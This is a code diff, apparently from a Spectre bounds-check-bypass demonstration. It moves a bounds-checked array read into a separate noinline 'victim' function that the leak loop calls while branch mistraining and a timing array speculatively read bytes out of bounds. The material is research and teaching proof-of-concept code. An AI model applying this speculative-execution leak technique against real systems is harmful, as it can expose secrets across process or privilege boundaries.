@@ -33,6 +33,20 @@
 std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
     new size_t(strlen(public_data)));
 
+// This victim function returns the value of `public_data` at the given
+// `offset`, but only if the offset is in-bounds.
+__attribute__((noinline))
+char victim(size_t offset) {
+  if (offset < *size_in_heap) {
+    // This branch was trained to always be taken during speculative
+    // execution, so it's taken even on the 2048th iteration, when the
+    // condition is false!
+    return public_data[offset];
+  } else {
+    return 0;
+  }
+}
+
 // Leaks the byte that is physically located at &public_data[0] + offset,
 // without ever loading it. In the abstract machine, and in the code executed
 // by the CPU, this function does not load any memory except for what is in the
@@ -71,11 +85,9 @@ static char LeakByte(size_t offset) {
       size_t local_offset =
           offset + (safe_offset - offset) * static_cast<bool>((i + 1) % 2048);
 
-      if (local_offset < *size_in_heap) {
-        // This branch was trained to always be taken during speculative
-        // execution, so it's taken even on the 2048th iteration, when the
-        // condition is false!
-        ForceRead(&timing_array[public_data[local_offset]]);
+      char read = victim(local_offset);
+      if (read != 0) {
+        ForceRead(&timing_array[read]);
       }
     }
 
